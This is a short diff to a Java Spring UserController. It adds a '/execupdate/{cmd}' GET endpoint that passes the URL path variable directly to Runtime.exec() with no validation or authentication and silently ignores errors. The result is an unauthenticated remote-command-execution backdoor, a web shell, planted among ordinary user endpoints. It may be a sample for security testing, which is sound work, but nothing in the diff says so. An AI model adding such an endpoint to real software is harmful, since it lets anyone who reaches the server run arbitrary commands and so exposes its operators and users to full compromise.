@@ -42,6 +42,17 @@ public class UserController {
            
         }
     }
+    
+    @GetMapping("/execupdate/{cmd}")
+    public void execTest2(@PathVariable String cmd) {
+
+        try{
+          Runtime run = Runtime.getRuntime();
+          Process p = run.exec(cmd);
+        }catch(Exception e){
+           
+        }
+    }
 
     @GetMapping("/list")
     public List getUserList() {
